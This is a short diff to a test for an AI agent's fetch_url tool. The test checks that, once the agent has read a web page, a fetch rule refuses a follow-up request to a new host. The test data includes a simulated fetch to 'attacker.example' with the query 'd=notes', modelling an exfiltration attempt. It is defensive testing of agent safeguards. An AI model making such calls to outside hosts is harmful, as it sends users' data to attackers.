@@ -171,6 +171,6 @@ describe("fetch_url tool", () => {
     const { run, inputs } = await go(agent({ allowedHosts: ["example.com"] }), [fetchCall("https://example.com/"), fetchCall("https://attacker.example/?d=notes"), say("done")]);
     expect(run.status).toBe("succeeded");
     // After the first page the fetch rule of item 47 refuses the new host before the allowlist is asked.
-    expect(toolText(inputs)).toMatch(/already read a web page, so it may fetch only from example\.com now\. attacker\.example is a new host/);
+    expect(toolText(inputs)).toMatch(/so it may fetch only from example\.com now\. attacker\.example is a new host/);
   });
 });
